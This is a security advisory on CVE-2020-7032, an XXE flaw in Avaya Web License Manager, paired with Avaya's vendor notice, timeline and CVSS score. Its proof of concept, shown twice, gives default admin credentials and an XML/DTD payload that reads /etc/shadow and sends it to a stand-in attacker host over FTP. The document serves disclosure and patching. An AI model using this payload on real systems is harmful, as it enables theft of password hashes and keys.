Found

01.03.2020

By

M. Koplin (Office Munich) | SEC Consult Vulnerability Lab

By using an XXE injection it is possible to read confidential data like /etc/shadow or private keys. In addition, a special payload can affect the availability of the web application.

## Vendor Description

*“As a global leader in delivering superior communications experiences, Avaya provides the most complete portfolio of software and services for multi-touch contact center and unified communications offered on premises, in the cloud, or a hybrid. Today’s digital world centers on communications enablement, and no other company is better positioned to do this than Avaya.”*

Source: <https://www.avaya.com/en/>

## Business Recommendation

The vendor provides a patch for the Avaya Web License Manager which should be installed immediately.

SEC Consult recommends to perform a thorough security review conducted by security professionals to identify and resolve all security issues.

## Vulnerability Overview / Description

### Blind Out-Of-Band XML External Entity Injection (CVE-2020-7032)

This vulnerability within the Avaya Web License Manager (WebLM) allows an authenticated user to read arbitrary files in the context of the Webserver (Tomcat) by uploading a specially crafted XML file within the License upload functionality. Accessible sensitive files that can be read are for example /etc/shadow, SSH keys or other configuration files.

## Proof Of Concept

### Blind Out-Of-Band XML External Entity Injection (CVE-2020-7032)

Login as a user to [$IP/WebLM/](https://$IP/WebLM/) and navigate to “Install License”. If WebLM has never been used before or not hardened, the default credentials are admin:weblmadmin

Create an XML file like the following:

***<?xml version="1.0" ?> <!DOCTYPE a [ <!ENTITY % asd SYSTEM "http://$ATTACKER\_IP/xxe\_file.dtd"> %asd; %c; ]> <a>&rrr;</a>***

and a DTD file like:

***<!ENTITY % d SYSTEM "file:///etc/shadow"> <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://$ATTACKER\_IP:2121/%d;'>">***

Start a webserver, e.g.

***SimpleHTTPServer***

***python -m SimpleHTTPServer 80***

and an FTP Server like GO XXE FTP Server

***./xxeserv 2121***

Upload the crafted XML file by clicking the install button.

## Vulnerable / Tested Versions

The following version has been tested:

* Avaya Web License Manager 6.3

The vendor doesn’t support versions < 7.x. Probably all versions <7 are affected.

Vendor description:
-------------------
"As a global leader in delivering superior communications experiences,
Avaya provides the most complete portfolio of software and services
for multi-touch contact center and unified communications offered on
premises, in the cloud, or a hybrid. Today's digital world centers on
communications enablement, and no other company is better positioned
to do this than Avaya."

Source: <https://www.avaya.com/en/>

Business recommendation:
------------------------
The vendor provides a patch for the Avaya Web License Manager which
should be installed immediately.

SEC Consult recommends to perform a thorough security review conducted by
security professionals to identify and resolve all security issues.

Vulnerability overview/description:
-----------------------------------
1) Blind Out-Of-Band XML External Entity Injection (CVE-2020-7032)
This vulnerability within the Avaya Web License Manager (WebLM) allows an
authenticated user to read arbitrary files in the context of the Webserver
(Tomcat) by uploading a specially crafted XML file within the License upload
functionality. Accessible sensitive files that can be read are for example
/etc/shadow, SSH keys or other configuration files.

Proof of concept:
-----------------
1) Blind Out-Of-Band XML External Entity Injection (CVE-2020-7032)
Login as a user to <https://$IP/WebLM/> and navigate to "Install License". If
WebLM has never been used before or not hardened, the default credentials are
admin:weblmadmin

Create an XML file like the following:

<?xml version="1.0" ?>
<!DOCTYPE a [
<!ENTITY % asd SYSTEM "[http://$ATTACKER_IP/xxe_file.dtd"](http://$ATTACKER_IP/xxe_file.dtd%22);>
%asd;
%c;
]>
<a>&rrr;</a>

and a DTD file like:

<!ENTITY % d SYSTEM "file:///etc/shadow">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://$ATTACKER_IP:2121/%d;';>">

Start a webserver, e.g. SimpleHTTPServer

python -m SimpleHTTPServer 80

and an FTP server like GO XXE FTP Server

./xxeserv 2121

Upload the crafted XML file by clicking the install button.

Vulnerable / tested versions:
-----------------------------
The following version has been tested:
* Avaya Web License Manager 6.3

The vendor doesn't support versions < 7.x. Probably all versions <7 are
affected.

Vendor contact timeline:
------------------------
2020-03-18: Contacting vendor through securityalerts () avaya com
2020-03-19: Vendor replied and started the process to verify the vulnerability
2020-04-03: Second mail to vendor to check if they have verified the issue
2020-05-18: Release of Hotfix for WebLM (embedded with SMGR) version 8.1.2.x
2020-07-01: Advisory release postponed, due to a delayed patch for version 7
2020-11-16: Patch release for version 7 and 8 of WebLM standalone and SMGR
2020-11-17: Publication of the advisory.

---

## 1. Overview:

Avaya WebLM provides ability to manage licenses of one or more Avaya software products for your organization. WebLM is Web-based and facilitates easy tracking of licenses.

An XML external entity (XXE) vulnerability in WebLM admin interface allows authenticated users to read arbitrary files or conduct server-side request forgery (SSRF) attacks via a crafted DTD in an XML request. This issue has been assigned Common Vulnerabilities and Exposures (cve.mitre.org) identifier [CVE-2020-7032](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7032).

Avaya would like to thank Markus Koplin of SEC Consult for reporting this issue.

## 2. Avaya Products affected:

For assessment and severity classification details refer to Section 3 of [Avaya's Product Vulnerability Response Policy](https://support.avaya.com/css/P8/documents/100045520).
The "Resolution" column will be updated as fixes are made available. Please reference the "Information" column for any additional information regarding the affected product.

| Product: | Version(s): | Resolution: | Information: |

**Recommended Actions for Products:**
Avaya strongly recommends following networking and
security best practices by implementing firewalls, ACLs,
physical security or other appropriate access restrictions.
Though Avaya believes such restrictions should always be in
place, risk to Avaya products and the surrounding network
from this potential vulnerability may be mitigated by
ensuring these practices are implemented until such time as
an Avaya provided product update or the recommended Avaya
action is applied.
Further restrictions as deemed necessary based on the
customer's security policies may be required during this
interim period, but the System Product operating system or
application should not be modified unless the change is
approved by Avaya. Making changes that are not approved may
void the Avaya product service contract.

### CVSS Scoring and Metrics:

Avaya uses the Common Vulnerability Scoring System
(CVSS) base score and metrics as reported by the vendor for the affected component(s) or by the National Institute of Standards and Technology in the National Vulnerability Database. In some cases, such as where CVSS information is not available from the vendor or NIST, Avaya will calculate the CVSS base score and metrics. Customers are encouraged to calculate the Temporal and Environmental CVSS scores to determine how the vulnerability could affect their specific implementation or environment. For more information on CVSS and how the score is calculated, see
[Common Vulnerability Scoring System: Specification Document](https://www.first.org/cvss/specification-document).

| Vulnerability | CVSSv3 Base Score | CVSSv3 Metrics |
| --- | --- | --- |
| [CVE-2020-7032](https://nvd.nist.gov/vuln/detail/CVE-2020-7032) | 6.5 (Medium) | [CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:H) |
